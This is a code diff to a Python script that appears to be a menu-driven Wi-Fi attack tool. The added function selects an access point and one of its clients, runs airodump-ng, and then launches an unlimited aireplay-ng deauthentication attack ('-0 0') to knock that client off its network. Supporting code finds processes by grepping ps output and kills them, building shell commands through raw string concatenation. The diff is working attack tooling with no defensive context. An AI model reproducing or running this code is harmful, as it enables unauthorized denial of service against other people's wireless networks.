@@ -144,7 +144,7 @@ def autoKillCommand(tx1,t):
         displayError()
         return()
     Popen(['nohup','/bin/bash','touchedcommand.sh'],preexec_fn=os.setpgrp)
-    DisplayText("","","Executed","","","","")
+    #DisplayText("","","Executed","","","","")
     time.sleep(t)
     #print(cmd)
     #subprocess.call(["timeout 2s",str(cmd)])
@@ -154,7 +154,24 @@ def autoKillCommand(tx1,t):
     if(toDEl==-1):
         displayError()
         return(-1)
-    return()
+    errore=0
+    while(errore == 0):
+            cmd = "ps -aux | grep '" + tx1 +"' | head -n 1 | cut -d ' ' -f7"
+            res = execcmd(cmd)
+            if(res==-1):
+                displayError()
+                time.sleep(5)
+                return()
+            cmd = "kill " + (str(res).split("'")[1])[:-2]
+            #print(cmd)
+            res = execcmd(cmd)
+            if(res==-1):
+                #print("errore nella kill")
+                #displayError()
+                time.sleep(5)
+                errore=1
+    return(True)
+    
 def checklist(_list):
     listattack=_list
     maxi=len(listattack) #number of records
@@ -1680,12 +1697,21 @@ def selectFromCat(cmd,outputFile):
 def deautherClient():
     ###select the AP
     displayMsg("Select the AP",3)
-    selectedAP=getSSID()
     #name,channel,mac
+    selectedAP = getSSID()
+    try:
+        selectedAP = selectedAP.split(",")
+        print(selectedAP)
+    except:
+        displayError()
+        return()
+
     if(not selectedAP):
         displayError()
         return()
     cmd = " airodump-ng -d " + selectedAP[2] + " -c " + selectedAP[1] + " wlan0mon -w result"
+    print(cmd)
+
     if(autoKillCommand(cmd,20)==-1):
         displayError()
         return()
@@ -1697,16 +1723,38 @@ def deautherClient():
     ret = str(ret).replace("\\r","").split("\\n")
     toRemove=ret.index("Station MAC, First time seen, Last time seen, Power, # packets, BSSID, Probed ESSIDs")
     ret=ret[toRemove+1:-1]
+    print(ret)
     for i in range(0,len(ret)):
-        ret[i] = ret[i].split(",")[0]
+        ret[i] = ret[i].split(",")[1]
     selectedtarget = checklist(ret)   
     print(selectedtarget)
+    tx1="airodump-ng -c " + str(selectedAP[1] )+" --bssid " + str(selectedAP[2]) + " wlan0mon"
+    tx2= "aireplay-ng -0 0 -a " + str(selectedAP[2]) + " -c " + str(selectedtarget)+" wlan0mon"
+    print(tx1)
+    if(autoKillCommand(tx1,2)==-1):
+        displayError()
+        return()
+    print(tx2)
+    if(autoKillCommand(tx2,10)==-1):
+        displayError()
+        return()
     
+
+
+
+
+
+
+
+
+
     cmd = "rm -rf result*"
     ret = execcmd(cmd)
     if(ret==-1):
         displayError()
         return()
+
+    
     return()
 
 
